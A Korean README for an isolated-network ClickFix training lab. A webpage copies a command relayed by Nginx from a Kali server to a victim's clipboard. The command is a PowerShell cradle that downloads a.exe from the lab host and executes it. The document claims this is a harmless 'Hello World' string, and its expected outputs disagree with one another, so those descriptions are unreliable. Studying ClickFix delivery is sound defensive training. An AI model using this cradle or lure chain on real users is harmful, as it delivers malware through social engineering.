# ClickFix 모의 실습 웹페이지

본 프로젝트는 Ubuntu Nginx 웹서버와 Windows Victim PC를 이용하여 ClickFix의 명령 전달 과정을 안전하게 모사하기 위한 교육용 실습 환경입니다.

웹페이지에서 `LAB 토큰 생성` 버튼을 누르면 Ubuntu Nginx가 Kali의 모의 콘텐츠 서버에서 허용된 문자열을 가져옵니다. JavaScript는 문자열이 정확히 일치하는지 검증한 뒤 Victim PC의 클립보드에 복사합니다. 웹페이지에서는 명령을 직접 실행하지 않습니다.

> ⚠️
> 이 실습은 반드시 외부망과 분리된 환경에서 진행해야 합니다. 실제 PowerShell 명령, 다운로드 명령 또는 악성 명령으로 변경하지 마십시오.

## 1. 실습 구성

```text
Kali 모의 콘텐츠 서버
192.168.50.10:8000
        | test.txt 제공
        v
Ubuntu Nginx 웹서버
192.168.50.30
        | /c2/lab-command.txt 경로로 중계
        v
Windows Victim
192.168.50.101
        | 버튼 클릭
        v
허용된 Hello World 명령이 클립보드에 복사됨
```

| VM | 역할 | IP 주소 |
| --- | --- | --- |
| Kali | 허용된 문자열만 제공하는 모의 콘텐츠 서버 | `192.168.50.10` |
| Ubuntu | 정적 웹페이지 제공 및 요청 중계 | `192.168.50.30` |
| Windows Victim | 브라우저를 이용한 사용자 동작 확인 | `192.168.50.101` |


모든 VM은 외부망과 분리된 `192.168.50.0/24` 실습망에 연결합니다.

## 2. 네트워크 설정

### 격리 실습망 설정

모든 VM의 실습용 네트워크 어댑터를 동일한 Host-only 또는 Internal Network에 연결하고 `192.168.50.0/24` 대역의 고정 IP를 설정합니다. 실제 실습 트래픽에는 NAT 또는 Bridged 네트워크를 사용하지 않습니다.

```text
Kali          192.168.50.10
Ubuntu Web    192.168.50.30
Windows       192.168.50.101
```

### 보조 NAT 어댑터 설정

패키지 설치 등 인터넷 연결이 필요하다면 VM 설정에서 다음 순서로 보조 NAT 어댑터를 추가합니다.

```text
Settings -> Add -> Network Adapter 2 -> NAT
```

Nginx 설치와 저장소 복제가 끝나면 보조 NAT 어댑터를 비활성화하거나 제거하여 실습 환경을 다시 격리합니다.

### Windows Victim 방화벽 설정

Windows Victim에서 파일 및 프린터 공유가 필요한 경우 관리자 권한 명령 프롬프트에서 다음 명령을 실행합니다.

```bat
netsh advfirewall firewall set rule group="파일 및 프린터 공유" new enable=Yes
```

이 방화벽 규칙은 브라우저를 통해 Ubuntu 웹페이지에 접속하는 데 필수는 아닙니다.

## 3. 기본 개발 환경

### Visual Studio Code 설치

[VS code](https://code.visualstudio.com/download)에서 설치 파일을 내려받습니다.

필요에 따라 다음 확장 프로그램을 설치합니다.

- Python
- Pylance
- GitLens
- Prettier - Code formatter
- ESLint
- Hex Editor
- YAML
- Remote - SSH

`Remote - SSH`를 사용하면 Windows의 Visual Studio Code에서 Ubuntu 서버에 SSH로 접속하여 코드를 편집할 수 있습니다.

### Git 설치 및 설정

[Git for Windows 공식 페이지](https://git-scm.com/install/windows)에서 Git을 설치합니다.

설치가 끝나면 Git 버전을 확인합니다.

```bash
git --version
```

Git 사용자 이름과 이메일을 설정합니다.

```bash
git config --global user.name "사용자 이름"
git config --global user.email "GitHub 이메일"
```

설정 내용을 확인합니다.

```bash
git config --global --list
git config --global credential.helper
```

### GitHub SSH 키 등록

HTTPS 방식으로 저장소 접근 권한 문제가 발생하면 SSH 방식을 사용합니다.

```bash
ssh-keygen -t ed25519 -C "GitHub 이메일"
```

별도의 설정이 필요하지 않다면 안내가 표시될 때마다 `Enter`를 눌러 기본 경로에 키를 생성합니다.

공개키를 확인합니다.

```bash
cat ~/.ssh/id_ed25519.pub
```

출력된 공개키를 GitHub의 다음 메뉴에 등록합니다.

```text
GitHub -> Settings -> SSH and GPG keys -> New SSH key
```

등록을 마친 뒤 GitHub 연결을 테스트합니다.

```bash
ssh -T git@github.com
```

## 4. Ubuntu에 Nginx 설치

Ubuntu에서 패키지 목록을 업데이트하고 Nginx를 설치합니다.

```bash
sudo apt-get update
sudo apt install -y nginx
```

Nginx를 부팅 시 자동으로 실행하도록 설정하고 즉시 시작합니다.

```bash
sudo systemctl enable --now nginx
```

서비스 상태를 확인합니다.

```bash
sudo systemctl status nginx
```

상태가 `active (running)`이면 정상입니다.

## 5. 웹 파일 배포

이 저장소의 웹 파일은 다음 구조로 구성되어 있습니다.

```text
ClickFix-WEB/
├── README.md
└── web/
    ├── index.html
    ├── css/
    │   └── style.css
    └── js/
        └── app.js
```

세 파일을 따로 분리하지 않고 `web` 폴더의 구조를 그대로 사용해야 합니다.

Ubuntu의 Nginx 기본 배포 경로로 이동하고 현재 사용자에게 해당 경로의 소유권을 부여합니다.

```bash
cd /var/www/html
sudo chown -R "$USER:$USER" /var/www/html
```

SSH 방식으로 저장소를 복제합니다.

```bash
git clone git@github.com:K-Shield-Jr-17/ClickFix-WEB.git
```

배포 파일을 확인합니다.

```bash
find /var/www/html/ClickFix-WEB/web -maxdepth 2 -type f
```

다음 세 파일이 출력되어야 합니다.

```text
/var/www/html/ClickFix-WEB/web/index.html
/var/www/html/ClickFix-WEB/web/css/style.css
/var/www/html/ClickFix-WEB/web/js/app.js
```

## 6. Kali 모의 콘텐츠 준비

Kali의 IP 주소가 `192.168.50.10`인지 확인합니다.

```bash
ip -4 addr
```

Kali 바탕 화면에 `test.txt` 파일을 생성합니다.

```bash
nano ~/Desktop/test.txt
```

다음 한 줄을 정확히 입력합니다.

```bat
powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'[해시값]'){&$p}else{ri $p -Force}"
```

`Ctrl+O`, `Enter`, `Ctrl+X` 순서로 눌러 저장하고 편집기를 종료합니다.

저장된 내용을 확인합니다.

```bash
cat ~/Desktop/test.txt
```

## 7. Kali HTTP 서버 실행

Kali에서 다음 명령을 실행합니다.

```bash
python3 -m http.server 8000 --bind 192.168.50.10 --directory ~/Desktop
```

실습 중에는 이 터미널을 종료하지 않습니다.

Ubuntu에서 Kali 서버에 연결되는지 확인합니다.

```bash
curl http://192.168.50.10:8000/test.txt
```

다음 문자열이 출력되면 정상입니다.

```bat
cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'8d85636b97a74705cbc1e5ba8c46389a4a8dc4846f0a12d7edf19b9695e8be94'){&$p}else{ri $p -Force}"
```

## 8. Ubuntu Nginx 중계 설정

기존 Nginx 설정 파일을 백업합니다.

```bash
sudo cp /etc/nginx/sites-available/default \
  /etc/nginx/sites-available/default.before-clickfix-lab
```

설정 파일을 엽니다.

```bash
sudo nano /etc/nginx/sites-available/default
```

내용을 다음과 같이 설정합니다.

```nginx
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /var/www/html/ClickFix-WEB/web;
    index index.html;

    server_name _;

    location / {
        try_files $uri $uri/ =404;
    }

    location = /c2/lab-command.txt {
        proxy_pass http://192.168.50.10:8000/test.txt;
        proxy_set_header Host $host;
        default_type text/plain;
        add_header Cache-Control "no-store";
    }
}
```

> [!NOTE]
> 웹페이지의 JavaScript는 `/c2/lab-command.txt` 경로를 요청하므로 Nginx의 `location` 경로도 동일해야 합니다. `proxy_pass` URL에는 `<` 또는 `>` 기호를 입력하지 않습니다.

설정 문법을 검사합니다.

```bash
sudo nginx -t
```

다음 결과가 표시되어야 합니다.

```text
syntax is ok
test is successful
```

검사가 성공하면 Nginx 설정을 적용하고 상태를 확인합니다.

```bash
sudo systemctl reload nginx
sudo systemctl status nginx
```

## 9. 중계 동작 확인

Ubuntu에서 다음 중 하나를 실행합니다.

```bash
curl http://127.0.0.1/c2/lab-command.txt
curl http://192.168.50.30/c2/lab-command.txt
```

다음 문자열이 출력되면 중계에 성공한 것입니다.

```bat
cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'[해시값]'){&$p}else{ri $p -Force}"
```

요청 흐름은 다음과 같습니다.

```text
Ubuntu 요청
-> Nginx
-> Kali 192.168.50.10:8000/test.txt
-> 허용된 명령 반환
```

## 10. Windows Victim 최종 테스트

Windows Victim에서 브라우저를 열고 다음 주소에 접속합니다.

```text
http://192.168.50.30
```

다음 순서로 테스트합니다.

1. `Ctrl+Shift+R`을 눌러 강력 새로고침합니다.
2. `LAB 토큰 생성`을 클릭합니다.
3. 팝업의 `확인`을 클릭합니다.
4. Windows 메모장을 실행합니다.
5. `Ctrl+V`를 눌러 클립보드 내용을 붙여넣습니다.

다음 내용이 붙여넣어지면 최종 성공입니다.

```bat
cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'[해시값]'){&$p}else{ri $p -Force}"
```

웹페이지는 이 명령을 실행하지 않고 클립보드에만 복사합니다.

## 11. 통신 및 로그 확인

Victim에서 버튼을 누르면 Kali 터미널에 다음과 비슷한 요청 기록이 표시됩니다.

```text
GET /test.txt HTTP/1.0 200
```

HTTP 버전에 따라 `HTTP/1.1`로 표시되어도 정상입니다.

Ubuntu에서는 Nginx 접근 로그를 확인할 수 있습니다.

```bash
sudo tail -f /var/log/nginx/access.log
```

전체 동작 흐름은 다음과 같습니다.

```text
Victim 브라우저
-> GET /c2/lab-command.txt
-> Ubuntu Nginx
-> Kali test.txt 요청
-> 파워쉘 명령어 반환
-> JavaScript가 문자열 검증
-> Victim 클립보드에 복사
```

## 12. 문제 해결

### 웹페이지에 접속할 수 없는 경우

- Ubuntu Nginx 상태가 `active (running)`인지 확인합니다.
- Victim에서 `192.168.50.30`으로 통신할 수 있는지 확인합니다.
- Ubuntu의 IP 주소가 `192.168.50.30`인지 확인합니다.
- 각 VM의 실습용 어댑터가 동일한 격리망에 연결되어 있는지 확인합니다.

```bash
sudo systemctl status nginx
ip -4 addr
```

### 웹페이지는 열리지만 복사되지 않는 경우

- Kali HTTP 서버가 실행 중인지 확인합니다.
- Ubuntu에서 `curl http://192.168.50.10:8000/test.txt`가 성공하는지 확인합니다.
- `test.txt`가 `cmd /k echo "powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'[해시값]'){&$p}else{ri $p -Force}"`와 정확히 일치하는지 확인합니다.
- Nginx 경로가 `/c2/lab-command.txt`인지 확인합니다.
- `Ctrl+Shift+R`을 눌러 브라우저 캐시를 새로고침합니다.
- 브라우저 개발자 도구의 Network 및 Console 탭에서 오류를 확인합니다.

### Nginx 설정 적용에 실패하는 경우

다음 명령으로 설정 오류와 서비스 로그를 확인합니다.

```bash
sudo nginx -t
sudo journalctl -u nginx --no-pager -n 50
```

문제가 해결되지 않으면 백업한 설정으로 복구한 뒤 다시 검사합니다.

```bash
sudo cp /etc/nginx/sites-available/default.before-clickfix-lab \
  /etc/nginx/sites-available/default
sudo nginx -t
sudo systemctl reload nginx
```

### Kali 서버 요청이 기록되지 않는 경우

- Kali HTTP 서버가 `192.168.50.10:8000`에 바인딩되어 있는지 확인합니다.
- Ubuntu에서 Kali의 `8000/tcp` 포트로 접근할 수 있는지 확인합니다.
- Nginx의 `proxy_pass` 주소가 `http://192.168.50.10:8000/test.txt`인지 확인합니다.

## 13. 주의사항

- Kali의 `test.txt` 내용이 허용된 문자열과 조금이라도 다르면 JavaScript가 복사를 차단합니다.
- Kali HTTP 서버를 종료하면 클립보드 복사에 실패합니다.
- 웹페이지는 문자열을 검증해 클립보드에 복사할 뿐, 명령을 실행하지 않습니다.
- 실제 명령 실행, 페이로드 다운로드 또는 외부 C2 연결 용도로 사용하지 마십시오.
- 실습망은 외부망과 분리된 Host-only 또는 Internal Network로 구성해야 합니다.
- 인터넷 사용을 위해 추가한 보조 NAT 어댑터는 실습 전에 비활성화하거나 제거합니다.
- 실습이 끝나면 모든 VM의 네트워크 격리 상태를 다시 확인합니다.
